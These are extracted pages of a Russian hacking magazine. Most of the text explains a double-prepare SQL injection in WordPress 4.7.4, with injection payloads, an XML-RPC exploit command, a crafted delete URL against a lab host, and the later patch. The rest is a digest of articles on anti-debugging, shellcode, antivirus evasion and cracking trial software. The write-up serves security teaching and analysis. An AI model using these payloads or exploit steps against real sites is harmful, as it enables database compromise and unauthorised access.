В качестве первого параметра ука зыва ем %1$c, а в качес тве второго —
солянку типа +92 OR 1#.





        Успешная SQL‐инъекция в WordPress через двойной prepare

Вуаля! Мы обош ли авториза цию и успешно заинжекти лись в запрос.
   То же самое можно про вернуть и с использовани ем отрицательного чис‐
ла. Сути это не меня ет, просто интересная особенность. Кто знает — вдруг
она тоже пригодится.
   ASCII — одно бай товая кодировка, и коды применя ют значение от 0 до 255.
Поэтому чис ла, не вхо дящие в диапазон от 0 до 255, при водятся к нему. Если
указать число боль ше 255, то из него нужно вычесть 256, чтобы узнать, какой
символ вернет %c пос ле обработки. К отри цательному числу, наоборот, нужно
при бавить 256, что бы узнать, какому сим волу соответствует данный код.
Для обратной процедуры знаки операций, разумеется, сле дует поменять.
Нап ример, 43 в десятичной системе — это +, соответс твенно, числа 299
(43+256) и ‐213 вернут тот же самый сим вол.


print(sprintf('2 %c 2 = 4', '299')); // 2 + 2 = 4
print(sprintf('2 %c 2 = 4', '‐213')); // 2 + 2 = 4




           Осо бенности работы плейсхол дера %c из sprintf

По этому второй параметр из экспло ита пре обра зует ся в такой вид: ‐164 OR
1#.





   Еще один вариант SQL‐инъ екции в WordPress через двойной prepare



                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ





                  РАСКРУЧИВАЕМ УЯЗВИМОСТИ В WORDPRESS,
                                  ПРЕПАРИРОВАВ МЕТОД
                                                PREPARE





ДРУГОЙ ВАРИАНТ ЭКСПЛУАТАЦИИ
Су ществует и еще один вари ант эксплуатации двойного prepare. На этот раз
плагин содержит вот такой кусок кода.


$prepared_creds = $wpdb‐>prepare("user_login = %s AND user_pass = %s"
, $_GET['login'], $_GET['pass']);
print_r( $prepared_creds.PHP_EOL );
$sql = "SELECT id, user_login, user_pass FROM $wpdb‐>users WHERE
$prepared_creds AND user_status = %d";
$prepared_sql = $wpdb‐>prepare($sql, 0);
print_r( $prepared_sql.PHP_EOL );
var_dump( $wpdb‐>get_results( $prepared_sql ) );

Здесь уже не получится вос пользовать ся трюком из предыду щего раздела,
потому  что  логин и пароль обрабатывают ся вмес те, одним prepare,
а парамет рами вто рого мы манипулировать не можем, так как он не при нима‐
ет юзердату.
   Чтобы разрешить эту проб лему, нужно еще нем ного изучить особенности
обработ ки плейсхолдеров. Из до кументации ты можешь узнать алго ритм,
по которо му они ищут ся в стро ке. Сейчас нас интересу ет только то, что после
%1$ сов сем необязательно должен сра зу идти тип (%s, %d и так далее), там
также могут быть указаны модификаторы заполнения, выравнивания, ширины,
да и сам модификатор типа может быть указан несуществу ющий. Например,
рас смот рим такой вот код:


var_dump(sprintf('%A bottles', '1337')); // string(8) " bottles"

Так как типа А не существу ет, вместо него не выводится ничего. И пример
номер два:


var_dump(sprintf('% bottles', '1337')); // string(17) "101001
11001ottles"

Знак процента сообщил парсеру, что дальше начинается опи сание плей схол‐
дера. Пос ле сим вола пробела он натыка ется на b, а это модификатор типа,
который означает, что передан ный аргу мент будет трактоваться как целое
и выводиться в виде двоичного числа. Что и можно наблюдать в воз вра‐
щаемой строке. К сло ву ска зать, пробелов может быть любое количество,
они просто отбра сываются.


var_dump(sprintf('%       bottles', '1337')); // string(17) "101001
11001ottles"

Те перь немного о выравнивании и ширине. Мы можем задавать минимальную
длину строки, которую будет воз вращать функция sprintf. Если длина
результирующей стро ки меньше ука занной, то она допол няет ся опре делен‐
ными символами. По умолчанию — про белами с левой стороны. Для указания
минимальной длины нужно добавить целое  числовое  значение прямо
перед модифи като ром типа.


var_dump(sprintf('%       50snakes', '1337')); // string(55)
"                                              1337nakes"

Об рати вни мание, что для парсера этот модификатор выглядит как %50s,
а nakes — это уже просто стро ка. То есть буква s из слова snakes выступила
в роли модифи като ра типа.
  Надеюсь, пока все понятно. Дальше задаем символ, который будет
использоваться для добивания строки до ука занной длины. Это можно сде‐
лать с помощью оди нарной кавычки, пос ле которой идет нужный сим вол.


var_dump(sprintf('%     \'#50snakes', '1337')); // string(55)
"##############################################1337nakes"

Пе ред всей структурой плей схолдера может стоять сколько угод но пробелов,
но она целиком должна находиться в одном месте. Разуме ется, все то же
самое акту ально и для нумерованных плейсхол деров.


var_dump(sprintf('%1$     \'#50snakes', '1337')); // string(55)
"##############################################1337nakes"





   Еще несколько осо бенностей использования плейсхолдеров в sprintf

Те перь возвращаемся к коду WP. Нас интересует строка 1308.


/wp-includes/wp-db.php
1308:       $query = preg_replace( '|(?<!%)%s|', "'%s'", $query );
// quote the strings, avoiding escaped strings like %%s

Все %s в переданной стро ке оборачи вают ся в оди нарные кавыч ки, кро ме %%s.
Значит, если мы передадим конструк цию вида %1$%s, в результате она будет
выглядеть как %1$'%s'. А при повторной обра ботке методом prepare фун‐
кция vsprintf вос при мет эту часть как целый плейсхолдер, где
 • %1$ — номер атрибута, который нуж но подставлять;
 • '% — сим вол, которым нужно будет дополнить строку, если она будет
   меньше указанной дли ны. В дан ном случае этим сим волом становится %;
 • s — модифи катор типа атрибута. В данном случае стро ка.

В ито ге у нас осталась лиш няя одинарная кавычка, которая в результате
и попадает в зап рос. Рас смотрим на нашем примере. В параметре «логин»
отправим %1$%s. Пос ле пер вого prepare мы получа ем условие user_login =
'%1$%s'  AND  user_pass  =  'idontknow'. Во вто ром prepare получится
такой зап рос:


SELECT id, user_login, user_pass FROM wp_users WHERE user_login = '%1
$'%s'' AND user_pass = 'idontknow' AND user_status = %d

Пос ле vsprintf он при мет окон чательный вид:


SELECT id, user_login, user_pass FROM wp_users WHERE user_login = '0'
' AND user_pass = 'idontknow' AND user_status = 0

Ес ли заг лянуть в документацию MySQL, то мож но узнать, что две идущие под‐
ряд одинарные кавыч ки в строке, которая обер нута в одинарные кавычки,
пре образуют ся в одну (так как первая экра нирует вто рую).





  Выдержка из документации MySQL о строках и использовании кавычек
  в них

Говоря проще, в нашем примере из таб лицы будут выбираться записи,
у которых поле user_login = "0' AND user_pass = ".





  Еще один вари ант внедрения в зап рос при использовании двух методов
  prepare

Все, что осталось сделать, — это прев ратить зап рос в валидный. Тут все
очень прос то — обычная инъ екция.





  И еще один вариант SQL‐инъекции в WordPress через двойной prepare

Здесь притаился еще один способ экс плу атации. На самом деле в качес тве
первого параметра (login) нам достаточ но прос то передать %1$, чтобы триг‐
гернуть  уязвимость.  Тогда  после  первого  prepare  получаем  условие
user_login = '%1$' AND user_pass = 'OR+1#', где
 • %1$ — номер атрибута, который нуж но подставлять;
 • ' — сим вол, которым нужно будет дополнить стро ку, если она будет мень‐
  ше указанной дли ны;
 • A — модифи катор типа атрибута.

Модифи катор типа получа ется невалидным, и весь плей схолдер %1$'  A
прос то выб расывается. Это значит, что мы изба вились от кавычки, в резуль‐
тате к БД уходит такой запрос:


SELECT id, user_login, user_pass FROM wp_users WHERE user_login = 'ND
 user_pass = 'OR+1#' AND user_status = 0





   Оче редной вариант SQL‐инъекции в WordPress через двойной prepare




                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ





                  РАСКРУЧИВАЕМ УЯЗВИМОСТИ В WORDPRESS,
                                  ПРЕПАРИРОВАВ МЕТОД
                                                PREPARE





PROOF OF CONCEPT
Пе реходим к реальным экс пло итам. Что бы обнаружить потенциально уяз‐
вимые участки, нам нужно прочесать исходни ки WordPress на предмет
использования двойного prepare. Это можно сделать любым удобным спо‐
собом, я выбрал ста тический анализатор исходных кодов Checkmarx. Он,
конечно, топор ный и угло ватый, зато в нем реали зован собственный скрип‐
товый язык CxQL, который позволяет выпол нять гибкий поиск по исходникам.
Не боль шой скрип тик поможет най ти интерес ные места для дальнейше го ана‐
лиза.


CxList prepare = All.FindByMemberAccess("*", "prepare");
CxList influ = All.InfluencedBy(prepare);
result = prepare.FindByParameters(influ);





  Исполь зование анализатора исходников Checkmarx для поиска потен‐
  циально уязвимых мест в WordPress

Сре ди кучи ложных находок мы наткнемся на инте ресней шую функцию
delete_metadata, она удаляет метаданные, которые отно сятся к различным
объ ектам CMS: ком ментариям, аттачам, постам и подоб ным вещам.


/wp-includes/wp-db.php
287: /**
288:  * Delete metadata for the specified object.
...
306:  */
307: function delete_metadata($meta_type, $object_id, $meta_key, $
meta_value = '', $delete_all = false) {
...
366:    if ( $delete_all ) {
367:        $value_clause = '';
368:        if ( '' !== $meta_value && null !== $meta_value && false
!== $meta_value ) {
369:            $value_clause = $wpdb‐>prepare( " AND meta_value =
%s", $meta_value );
370:        }
371:
372:        $object_ids = $wpdb‐>get_col( $wpdb‐>prepare( "SELECT
$type_column FROM $table WHERE meta_key = %s $value_clause", $
meta_key ) );
373:    }

Как видишь, когда переменная $delete_all установлена, выпол няет ся кусок
кода, в котором име ется двой ное использование метода prepare. Первое —
в стро ке 369, вто рое — в строке 372, с уже обработанными данными $val‐
ue_clause.
  По умол чанию $delete_all объявляется как false, поэтому ищем все
места, где исполь зуется функция delete_metadata c пятым аргу ментом,
установленным в true. Также должно выполняться условие из стро ки 369:
четвертый аргумент $meta_value != ''. Под ходящий вызов есть в методе
wp_delete_attachment.


/wp-includes/wp-db.php
4839: /**
4840:  * Trash or delete an attachment.
...
4857:  */
4858: function wp_delete_attachment( $post_id, $force_delete = false
) {
...
4892:   // Delete all for any posts.
4893:   delete_metadata( 'post', null, '_thumbnail_id', $post_id,
true );

Из названия и опи сания становит ся понятно, за какую часть в системе она
отве чает.
  Ме татег _thumbnail_id хра нится в базе, он отве чает за привяз ку обложки
к записи. Поэтому нужно его сначала как‐то туда записать. Для этого понадо‐
бится поль зователь с правами, позволя ющи ми заг ружать и удалять меди‐
афай лы, например author. Далее алгоритм такой:
 • заходим от пользователя;
 • заг ружаем картинку и запоминаем ее ID;
 • соз даем запись в бло ге и выбира ем нашу картинку как обложку (ее ID
   запишется в метатег _thumbnail_id);
 • сох раняем и запоми наем ID созданной записи.

Далее нужно изме нить зна чение созданного метатега и записать туда пей‐
лоад. Сде лать это не так‐то просто. Требует ся пла гин для экспорта и импорта
записей либо нуж но восполь зоваться багом в XML‐RPC API, который присутс‐
твует в версиях WP 4.7.4 и ниже. Ого, так ведь у нас как раз 4.7.4!
   Уяз вимость заключается в том, что из‐за некор ректной фильтрации поль‐
зовательских дан ных с помощью XML‐RPC API мож но записы вать невалидные
данные в парамет ры объектов CMS. Экс плоит можешь скачать у меня
в репозитории.
   Итак, мы загрузили картинку и создали новый пост, их ID равны 5 и 6 соот‐
ветствен но. Теперь дело за сплоитом.


php xmlrpc_exploit.php http://wp.visualhack/xmlrpc.php author qazwsx
edc 6 5 sqli_here





  Исполь зуем XML‐RPC‐экс пло ит для записи нуж ного пейлоада
  в _thumbnail_id

Он успешно отработал, и в таб лице теперь находит ся нужное нам значение.
Осталось выполнить пей лоад, для это го нуж но получить CSRF‐токен _wp‐
nonce на страницы http://wp.visualhack/upload.php, а затем перей ти
по ссылке


view‐source:http://wp.visualhack/wp‐admin/upload.php?_wpnonce=912f84
726f&_wp_http_referer=%2Fwp‐admin%2Fupload.php&action=delete&
mode=list&media[]=5 %1$%s sqli_here

В качес тве параметра media[] указыва ем то значение, которое записывали
в _thumbnail_id.




       Успешная эксплуатация WordPress 4.7.4 через удаление атта ча

Мы успешно вкли нились в запрос, дальше уже тебе решать, как использовать
эту инъекцию.


ПАТЧ
Как ты понимаешь, эта проб лема была быстро устранена и для всех пос‐
ледних веток CMS сущес твует патч. Вот, например, ком мит с исправлени ем
уязвимос ти в версии 4.8.2. Добавлена еще одна замена по регулярному
выражению, призванная экраниро вать все типы, которые не входят в белый
спи сок d, s и F (целые, стро ки и числа с плавающей точкой).


/wp-includes/wp-db.php
1318: $query = preg_replace( '/%(?:%|$|([^dsF]))/', '%%\\1', $query )
; // escape any unescaped percents

На офи циаль ной странице документации метода prepare указано, что под‐
держивают ся только эти типы.



       This function only supports a small subset of the sprintf syntax; it only sup-
       ports %d (integer), %f (float), and %s (string). Does not support sign,
       padding, alignment, width or precision specifiers. Does not support argu-
      ment numbering/swapping.

Только вот кто чита ет документацию? В резуль тате перестали работать
тысячи плагинов. Писали даже о количестве строк, которые некорректно
отрабатывали пос ле пат ча, — 1,2 миллиона. Поэтому владельцы сай тов
и девело перы плагинов нехило всполошились и начали просить, чтобы все
вернули как было. Однако раз работчики WordPress ответили отказом: они
не будут добавлять под держку недокумен тированных типов переменных.
  На эту проб лему обратил внимание исследователь безопасности Энтони
Феррара (Anthony Ferrara), который выяснил, что фикс, выпущенный раз‐
работ чиками, не устраняет уяз вимость пол ностью. Хотя Феррара предос‐
тавил PoC‐эксплоит, команда WordPress не торопилась что‐то делать. О том,
как в течение полутора месяцев Энто ни пытал ся убедить разработчиков при‐
нять меры, ты можешь прочитать у него в блоге.
  Свой эксплоит Фер рара еще не выложил в паб лик, но мы с нетерпением
будем его ждать, что бы разоб рать ся в деталях. В бло ге есть некоторые
намеки на то, где можно поискать проблему. Дерзай, воз можно, ты най дешь
уязвимое место и напишешь свой эксплоит.
  В любом случае еще один фикс был выпущен, и пользователи получи ли
пол ностью переработанный механизм плей схолдеров. Быть может, пора бы
уже переходить на PDO?
  Еще хотелось бы добавить: если ты сам пишешь что‐нибудь, используя
код WP, то возьми за правило никогда (!) не исполь зовать метод prepare
для тех данных, которые уже были им обработа ны. К тому же существу ют фун‐
кции и фильтры, которые могут содер жать в себе этот метод, так что будь
начеку. Кто знает, какие еще проб лемы всплывут в реализации нового алго‐
ритма prepare.
  Все упомяну тые в статье тес товые скрипты и эксплоит ты всегда сможешь
най ти в моем репозитории.


ВИДЕО С ДЕМОНСТРАЦИЕЙ УЯЗВИМОСТИ





       VISUALHACK#22 WordPress 4.7.4 double prepare SQL injection


ВЫВОДЫ
Эта фундамен тальная уяз вимость присутс тво вала в коде на протяжении мно‐
гих лет — начиная с версии 2.3.0. Стандарты безопасности и их реализации
очень сильно меняются с течением времени и развитием технологий. То, что
казалось безопасным вчера, сегодня может быть с легкостью скомпромети‐
ровано. Нужно следить за потоком и ловить момен ты, когда пора прекращать
цеп ляться за старое и смотреть на новые методы — те, которые отвечают
текущим критери ям безопасности.
ВЗЛОМ





                                       Иван Пискунов





     САМЫЕ КРУТЫЕ МАТЕРИАЛЫ
     ПО РЕВЕРСИНГУ И MALWARE
            ЗА ТРИ ГОДА





Иног да мы, редакторы и авто ры журнала «Хакер», сами чита‐
ем журнал «Хакер». Нет, ну то есть мы пос тоянно его читаем
:), но иног да получается так, что, разрабатывая новые темы,
гуг лим что‐нибудь инте ресненькое, натыкаемся на крутую
статью, чита ем ее с огромным удо вольствием и вдруг
понима ем, что... это же мы ее и делали, причем, скажем,
все го пару лет назад. И при этом материал по‐прежнему
остается сов ремен ным! И действи тельно, нес мотря на всю
динамич ность нашей отрасли, существует определенная
клас сика, и прак тические кейсы, которые были акту альны,
скажем, в 2015‐м, будут актуаль ны еще несколько лет.


В общем, мы решили прошерстить все выпуски и сде лать для тебя подбороч‐
ку самых крутых матери алов, которые ты, в прин ципе, мог и про пустить.
Как говорит ся, от преданных читателей журнала — для преданных читателей
журнала (а что, я как раз такой — у меня вся под шивка с 2000 года лежит,
могу достать с антресолей и предъявить! — Прим. ред.).


БИБЛИОТЕКА АНТИОТЛАДЧИКА





Пе ред нами неболь шой гайд по техникам антиотладки при ложе ний. Несмотря
на то что статья довольно скром ная по объему, она очень качественно опи‐
сывает основные методы и трюки использования антиотладочных приемов
для противодей ствия анализу бинарного кода, то есть приложения. Помимо
теории, дают ся примеры кода, описание параметров и фла гов. В общем,
это must have настоящего реверсера! В заключении так же приведены мне ния
авто ритетных экспер тов Вячес лава Закоржевско го из «Лаборатории Каспер‐
ского» и Алексан дра Матросова, некогда Senior virus researcher в лабора‐
тории ESET.
   Ска чать PDF


АНТИОТЛАДОЧНЫЕ ТРЮКИ. АКТИВНО ПРОТИВОДЕЙСТВУЕМ
ОТЛАДКЕ НАШЕГО ПРИЛОЖЕНИЯ





В матери але рассматриваются кей сы использования особенностей выпол‐
нения машинного кода для противо действия отладке. В час тнос ти, API‐фун‐
кции rdtsc (Read Time Stamp Counter) и осо бенности реализации на процес‐
сорах Intel и AMD. Расска зывается про выполнение некоторых инструкций
CPU, поз воляющих соз давать анти отладочные методы, обойти которые спо‐
собен не каждый реверсер.
   Ска чать PDF


VEH В WINDOWS X64. УСЛОЖНЯЕМ АНАЛИЗ КОДА С ПОМОЩЬЮ
ВЕКТОРНОЙ ОБРАБОТКИ ИСКЛЮЧЕНИЙ





Быть может, тебе уже доводи лось читать об обра ботке исключений в x64. Ну
а если нет, эта статья как раз для тебя! Описыва ется и теория и практика
использования векторной обра бот ки исклю чений в при ложе ниях, написан ных
под ОС Windows. Представленная информация довольно ред кая и почти
не имеет аналогов в программист ской русскоязычной литера туре.
   Ска чать PDF


ОТЛАДКА VS ЗАЩИТА. ПРОСТЫЕ СПОСОБЫ СЛОЖНОЙ ОТЛАДКИ





Ты пом нишь игрушки, защищенные от копиро вания технологи ей StarForce
Protection System? Так вот, в этой статье автор пред лагает познакомиться
с некоторыми неп росты ми видами защит ных механиз мов, их описани ем, при‐
мера ми реализации и оценкой. Это хоть небольшой, но полез ный экскурс
в мир противостояния средств защиты и средств анализа. Ты смо жешь узнать
под робнос ти и техничес кие детали и пер вого и второго.
   Ска чать PDF


БУРИМ ЯДРО WINDOWS. KERNEL POOL OVERFLOW — ОТ ТЕОРИИ К
ПРАКТИКЕ





Ядро Windows  всегда было лакомым  кусочком  для  хакера, особенно
при наличии готовых экс пло итов, приводящих к повыше нию прав. Автор
статьи рас сказыва ет о том, как мож но проэкс плу атировать уязвимости ядра
сов ременных NT‐систем путем манипуляций со страницами памяти. При‐
водятся при меры кода и описание тех нологии использования кода. Всем, кто
интересуется rootkit‐технологиями, к прочтению обя зательно!
   Ска чать PDF


КРЯК БЕЗ ДИЗАССЕМБЛЕРА





Статья легендарно го Криса Кас перски. Универсальный взлом три альных
программ. У тебя установлен триальный шаровар? Тридцать дней истекли
и прог рамма не работает? Ни знания ассемблера, ни навыка работы
с отладчиком, ни утомительного поиска торкающе го кряка/серийника/кей‐
гена не тре буется. Просто берем и лома ем!
   Ска чать PDF


ЭНЦИКЛОПЕДИЯ АНТИОТЛАДОЧНЫХ ПРИЕМОВ





Еще одна статья Кри са Касперски. На этот раз он рас сказывает, какой софт
и для каких целей понадобит ся, если ты всерь ез решил взяться за дело
ревер синга. Несмотря на то что мажорные номера версий этого ПО уже дав‐
но ушли вперед, сами инстру менты оста ются актуальными и востребован‐
ными по сей день!
   Ска чать PDF


ДИЗАССЕМБЛИРОВАНИЕ C# ПРОГРАММ ОТ A ДО Z





Язык программирования C# активно продвигается Microsoft. А платформа
.NET про должает победоносное шес твие. Поэтому  неуди вительно,  что
довольно много программ компилируются имен но на этом языке. В статье
опять же Кри са Каспер ски объясня ется, как дизас семблировать Visual Basic /
C# сборки, патчить в hiew’е, вести отладку на уров не байт‐кода. Ты также
поупражняешься в написании своего собс твен ного crackme.
   Ска чать PDF


ВИРТУАЛЬНАЯ ОТЛАДКА





Отладка кода режима ядра существен но сложнее, чем отладка обыч ных прог‐
рамм. Оно и понятно: если для отладки пользователь ского кода ты можешь
использовать стандар тный дебаг гер, нап ример вши тый в Visual Studio или в
IDA, то для отладки кода режима ядра тре буются спецсредс тва. В статье
до деталей описыва ется отладка kernel mode кода с использовани ем VMware.
Такого под робного гайда на рус ском языке я еще не встречал.
   Ска чать PDF


УБИТЬ DEP’А. ТЕОРИЯ И ПРАКТИКА ОБМАНА HARDWARE-DEP





DEP, он же Data Execution Prevention, — это механизм, придуманный раз‐
работ чиками Microsoft для защиты понятно каких ОС от выполнения нелеги‐
тим ного кода, который чаще всего при меняется для экс плуатации уязвимос‐
тей или инфи цирования целевой машины жер твы. Помимо софтового DEP’a,
в современ ное железо вши та функция контроля на аппаратном уровне.
Механизм оказался вполне рабочий. Но рабочий не значит неуязвимый.
В статье автор на реальных при мерах рассказыва ет о DEP на аппаратном
уров не и том, как его можно хакнуть!
   Ска чать PDF


РУТКИТАМ — БОЙ!





Руткиты, как известно, очень коварная и опасная вещь. С помощью тулз дан‐
ного класса вирусописа тели скрывают при сутствие инфекции в сис теме
и успешно замета ют следы взлома. Но и для борь бы с ними в пос леднее вре‐
мя создано немалое количество специальных ути лит помимо встроенных
механизмов детекции антивирусного ПО. В статье автор рассмат ривает,
как вручную с помощью прог рамм Anti‐Spy Info, RootkitRevealer и некоторых
других найти в сис теме руткит, как для поиска использовать отладчик SoftICE
и чем пре дот вратить воз можное заражение системы.
   Ска чать PDF


МОРФИМ, НЕ ОТХОДЯ ОТ КАССЫ. МУТАЦИЯ КОДА ВО ВРЕМЯ
КОМПИЛЯЦИИ





Ты написал свой пер вый софт и задумался, как защитить его от взлома?
Покупать навесные защиты нет желания, а из freeware‐тулз нет ничего дей‐
ственного? Есть возможность защитить свою прог рамму средс твами ком‐
пилятора FASM. Автор рассказывает на прос тых примерах про методы
полимор физма (генерация мусорного кода), метаморфинга (замена инс трук‐
ций аналогами), пер мутации (случай ное перемешивание блоков кода с сох‐
ранением функциональности и логики работы), обфуска ции (метод запуты‐
вания логики кода, про тиводействие ана лизу), кон троля целостности кода
(для защиты от изме нения, патчей), шиф рование кода и данных.
   Ска чать PDF


МНОГОРАЗРЯДНЫЕ ШЕЛЛ-КОДЫ. ПИШЕМ RING0-SHELLCODE ПОД
WINDOWS X64





Заполучить шелл‐код — славная добыча для любого хакера, ведь это прямой
доступ в систему! Но дело требует существенных сил и знаний матчасти.
И если учесть, что 32‐битные ОС зна чительно раз нятся со своими 64‐бит‐
ными брать ями, привычные спо собы написания шелл‐кодов становятся
совершенно бесполезными. Поэтому по х64 при ходится копаться ручками,
сравнивать и анализи ровать. Чем и пред лага ет занять ся автор в данной
статье. В ито ге после практических занятий ты сам сможешь написать свой
первый ring0‐shellcode под х64‐винду! Ты готов? Вперед!
   Ска чать PDF


                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ





         САМЫЕ КРУТЫЕ МАТЕРИАЛЫ
        ПО РЕВЕРСИНГУ И MALWARE
                ЗА ТРИ ГОДА





ОБУЗДАТЬ WINDBG. ПРОСТЫЕ ПРИЕМЫ СЛОЖНОГО ОТЛАДЧИКА





И сно ва тема отладки. На дос ке для препарирова ния — WinDbg, мощный
отладчик для юзермодных при ложений и драй веров. И данная тема особенно
актуальна для ревер серов, которым пришлось полностью или частично
перейти на 64‐битные платформы. Ведь, по сути, ни один име ющийся x64‐
отладчик не способен сравнить ся с WinDbg по возможнос тям, так что в статье
речь пойдет в основном про 64‐бит ные версии Windows. Но и обладатели 32‐
битных смогут обна ружить для себя интересную информацию.
   Ска чать PDF


ДРАЙВЕРЫ АНТИВИРУСОВ — ИСТОЧНИК ЗЛА. УЯЗВИМОСТИ В
ДРАЙВЕРАХ ПРОАКТИВНЫХ ЗАЩИТ





Из теории кодопи сательства известно, что большое количество программ,
предназначенных для анти вирусной защиты, используют драйверы режима
ядра в Windows как «окно» для доступа в более привилегированный режим —
ring 0. Это класс ПО, к которому можно отнести анти вирусы, межсетевые
экраны, HIPS’ы (Host Intrusion Prevention System) и популярные ныне прог‐
раммы класса internet security. Но, как показывает практика, мно гие из них
содержат уязвимости. А в большинстве соф тверных компаний их драйверы
не тестиру ют. Вывод прост: драйверы антивиру сов — лакомый кусочек
для хакера. Автор опи сывает, какие есть проб лемы в современных драйверах
защит ного ПО, и показы вает, как их можно успешно проэкс плуати ровать. Вот
нас тоящая тема для исследователей багов и разработчиков эксплоитов!
   Ска чать PDF


АССЕМБЛЕРОМ ПО ЭВРИСТИКЕ. НАКОРЯЧИВАЕМ AVG, AVAST,
CLAMAV, PANDA, COMODO: ПРОСТО, ЭФФЕКТИВНО И БЕЗ
ИЗВРАЩЕНИЙ





Эвристический анализатор стал штатным механизмом современного анти‐
вирусного ПО. Резон в этом есть: его задача — обнаруживать необнаружи‐
ваемое, находить неиз ведан ное. Концепция, направленная в противовес сиг‐
натурному детекту, основанному на базах дан ных. Поэто му антивирусные
лабора тории постоянно совер шенству ют алгоритмы своих эвристичес ких
ана лизаторов. Однако и их можно обой ти. Как? В данной статье автор
демонстри рует, как, используя код на ассемблере, уде лать многих име нитых
вендоров. Читаем, смот рим, эксперимен тируем.
   Ска чать PDF


МАЛВАРЩИКИ ПРОТИВ PATCHGUARD. ЛЕЗЕМ В НЕДРА
ТАИНСТВЕННОЙ ТЕХНОЛОГИИ MICROSOFT — KERNEL PATCH
PROTECTION





Кто, как не Microsoft, знает цену атаки на производимые ей опе рационные
системы? Так, с релизом Windows Server 2003 MS запус тила в массы
механизм защиты ядра от изменений, получивший название Kernel Patch Pro‐
tection, более известный ныне как PatchGuard. Фича, помогающая защититься
боль ше от кри вых рук программистов, пишущих корявые поделки, может при‐
годиться и в деле борьбы с рут китами. Итак, автор статьи погружает нас
в деб ри Kernel Patch Protection, рассказывает, как мож но ее юзать для защиты
системы от падения ядра, и собственно о том, как этот механизм можно пре‐
одолеть.
   Ска чать PDF


ИЗУЧАЕМ АНТИВИРУС. РАСКОВЫРИВАЕМ АНТИВИРУСНЫЙ
СКАНЕР, ЭВРИСТИЧЕСКИЙ АНАЛИЗАТОР И ЭМУЛЯТОР В
АНТИВИРУСНЫХ ПРОГРАММАХ





Ме ня всегда интересовало, как работа ет анти вирусное ПО. Прос то было
любопыт но. А пос ле того, как я занялся темой reverse malware, это перешло
в область профессиональных интересов. Толь ко вот по‐настоящему полез‐
ной инфы на эту тему никог да не было. Да и в официаль ных источниках она
вряд ли когда‐то появит ся. А вот в этой статье автор на понятном для читате‐
ля языке популяр но расска зывает, как работа ет современ ный антивирус. Мы
уви дим под мик роско пом, как сканер анализи рует файлы, как отрабаты вает
эвристика и пашет эмулятор кода, зашитый в антивирусный дви жок.
   Ска чать PDF


БУРИМ АНТИВИРУС. ЕЩЕ ГЛУБЖЕ! РАССМАТРИВАЕМ СПОСОБЫ
МОНИТОРИНГА СОБЫТИЙ И ПРОАКТИВНОЙ ЗАЩИТЫ В РАЗНЫХ
АНТИВИРУСНЫХ ПРОГРАММАХ





И сно ва тема изучения потрохов антивирус ного ПО. На сей раз рас сказыва‐
ется о тех нологии HIPS (Host Intrusion Prevention System) — так называемом
про активном детек тирова нии (поведен ческий анализ, анализ, осно ванный
на монито рин ге системных событий). И автор копа ет в глубину вопроса, ведь
под этими поняти ями может скрываться, нап ример, как при митивная защита
нескольких клю чей реестра или уведом ления о попытках доступа к опре‐
деленным директориям, так и анализ поведения прог рамм или какая‐либо
другая технология, основанная на монито рин ге системных событий. Под‐
ходит для тех, кто серьезно интересуется малварью. ;)
   Ска чать PDF


ТИБЕРИУМНЫЙ РЕВЕРСИНГ. ВНЕДРЕНИЕ Х-КОДА И ВИРТУАЛЬНАЯ
МАШИНА: ТЕОРИЯ И ПРАКТИКА





Ты наверняка играл в Command & Conquer, и если она была лицензионная, то
помнишь неудач ные попытки сделать виртуальный образ диска. Виной тому
малоизвес тная система защиты от копирования кон тента с названием Secu‐
ROM. Хотя Sony как владелец сту дии разработки и отказалась от услуг
нулевого  коль ца  пос ле  нескольких  судеб ных  раз бирательств,  ребята
из инсай дного подразделения Protection Technology продол жают поль зовать‐
ся низкоуровневыми функциями, где абсолютным чемпионом по вызову счи‐
тается KeBugCheckEx. Однако нет ничего абсолютно надежного, и вот приш‐
ла оче редь раз бора методов взлома SecuROM. В матери але рассматрива‐
ется       On‐line       patching,      использующее      WinAPI‐функции
ReadProcessMemory/WriteProcessMemory, Oﬄine patching через GetComman‐
dLine/GetFilePath и DLL hijacking с дос тупом в таблицу импорта (точнее, фун‐
кция DllMain).
   Ска чать PDF


X-ПРЕПАРАЦИЯ: ВСКРЫВАЕМ ХИТРЫЙ SALITY.AA. УЧИМСЯ
РАСПОЗНАВАТЬ ПОЛИМОРФИЗМ И ОБФУСКАЦИЮ КОДА НА
ПРИМЕРЕ ИЗВЕСТНОГО ВИРУСА





Технический анализ в дан ной статье посвящен полиморфному генератору
инструкций, применяемо му в известном вирусе Virus.Win32.Sality.aa. Он поз‐
воля ет получать различный обфусцированный код с примене нием FakeAPI
при каж дом его использовании. Но это не все, автор рассматрива ет не прос‐
то алгоритм, а тон кости формирования x86‐инс трук ций — пре фиксы, опкоды,
поля ModRM, SIB. Так же не останутся без внимания общие схе мы работы
обфускатора и непосредственно генератора кода.
   Ска чать PDF


МОБИЛЬНАЯ МАЛВАРЬ ПОД МИКРОСКОПОМ. РАССМАТРИВАЕМ
«ЭРОТИЧЕСКИЙ» J2ME-ЗЛОВРЕД ВО ВСЕХ ИНТИМНЫХ
ПОДРОБНОСТЯХ





Мал варью под мобильные устройства никого уже не уди вишь. В отличие
от  PC‐шных  вер сий  мобильная  малварь,  как  пра вило,  маскируется
под какое‐нибудь легитимное приложение или игру и нацеле на на опус‐
тошение счета вла дель ца. Сегодня в нашей лабора тории мы изучим зловред
под Java 2 Micro Edition (J2ME). Предваритель но автор запускает зловред
под эмулято ром Sjboy. И вот игра‐троян на тво ем дис плее. Технические под‐
робнос ти с примерами кода под катом можно посмотреть в дан ной статье.
   Ска чать PDF


НА МАЛВАРЬ БЕЗ АНТИВИРУСА. ЧТО ДЕЛАТЬ, ЕСЛИ ЕГО БАЗЫ
ЕЩЕ НЕ УСПЕЛИ ОБНОВИТЬСЯ?





Разработ чики антивирусов заявляют, что защититься от малвари можно, толь‐
ко используя антивирус ные про дукты. Если пропус тить область мар кетин га,
в чем‐то они дей ствительно пра вы. Но на практике бывают ситуации, когда
сиг натурные базы еще не успели обновиться, а вредонос уже проник
на машину. Или складывается так, что в системе вообще ничего не установ‐
лено из средств защиты. Неужели дело безнадежно? Вовсе нет — если у тебя
есть голова и прямые руки, ты сможешь не только вылечить систему от инфи‐
цирования, но и пре дотвратить посягательства мал вари на твое индивиду‐
